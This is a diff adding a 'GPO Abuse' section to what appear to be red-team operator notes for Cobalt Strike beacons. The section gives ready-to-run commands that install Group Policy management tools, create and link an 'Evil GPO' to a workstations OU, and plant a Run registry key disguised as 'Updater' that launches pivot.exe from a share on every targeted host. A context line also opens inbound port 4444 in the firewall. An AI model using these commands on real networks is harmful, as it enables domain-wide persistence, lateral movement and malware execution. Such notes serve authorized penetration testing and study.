@@ -126,3 +126,21 @@ Query to execute beacon on the instance directly:
 add firewall rule:
   
 > beacon> run netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
+
+## GPO Abuse
+  
+Check if Module is installed:
+  
+> beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
+  
+if its not, use a beacon with local admin rights and install (takes some time, wait for output):
+  
+> beacon> powershell Install-WindowsFeature -Name GPMC
+  
+### Create Evil GPO
+  
+> beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=sample,DC=domain"
+  
+Create Autorun key on target hosts:
+  
+> beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\public\share\pivot.exe" -Type ExpandString
